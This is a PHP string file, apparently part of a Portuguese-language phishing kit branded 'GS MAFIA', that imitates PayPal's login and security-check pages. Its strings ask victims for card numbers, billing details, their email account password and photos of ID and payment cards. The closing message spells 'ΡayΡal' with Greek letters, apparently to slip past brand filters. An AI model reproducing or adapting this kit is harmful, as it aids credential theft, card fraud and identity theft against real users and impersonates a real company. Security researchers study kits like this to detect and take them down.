<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "E-mail";
$gs_string2 = "Próximo";
$gs_string3 = "Está tendo problemas para fazer o login?";
$gs_string4 = "ou";
$gs_string5 = "Inscrever-se";
$gs_string6 = "Entre em contato";
$gs_string7 = "Privacidade";
$gs_string8 = "Legal";
$gs_string9 = "Mundial";
$gs_string10 = "Alterar";
$gs_string11 = "Entrar";
$gs_string12 = "Sua segurança é nossa maior prioridade";
$gs_string13 = "Atualizar seu endereço de cobrança";
$gs_string14 = "Primeiro nome";
$gs_string15 = "Sobrenome";
$gs_string16 = "Endereço da rua";
$gs_string17 = "Cidade";
$gs_string18 = "código postal";
$gs_string19 = "Continuar";
$gs_string20 = "Feedback";
$gs_string21 = "Atualizar informações do cartão";
$gs_string22 = "Nome do titular do cartão";
$gs_string23 = "Mês";
$gs_string24 = "Ano";
$gs_string25 = "Verificação segura em 3-D";
$gs_string26 = "Atualizar seu acesso ao e-mail";
$gs_string27 = "Endereço de e-mail";
$gs_string28 = "Senha do endereço de e-mail";
$gs_string29 = "Anexar uma cópia do seu cartão de identidade";
$gs_string30 = "Anexar uma foto do seu cartão (verso / frente)";
$gs_string31 = "Concluir";
$gs_string32 = "Senha";
$gs_string33 = "Informações do cartão";
$gs_string34 = "Número do cartão";
$gs_string35 = "País";
$gs_string36 = "Parabéns";
$gs_string37 = "<center> Suas informações de conta enviadas estão sendo revisadas por nossa equipe. <br> <br> Enquanto isso, você pode acessar sua conta com uma segurança reforçada. <br> <br> <b> Obrigado por escolher ΡayΡal. </ B> <br> <br> <center> <br> <b> Você será redirecionado para acessar sua conta ΡayΡal ... </ b> <br> <br> ";
$gs_string38 = "Verificação de conta - Central de segurança";
$gs_string39 = "Faça o login na sua conta do PayPal";
$gs_string40 = "Verificação de conta - Central de segurança";
?>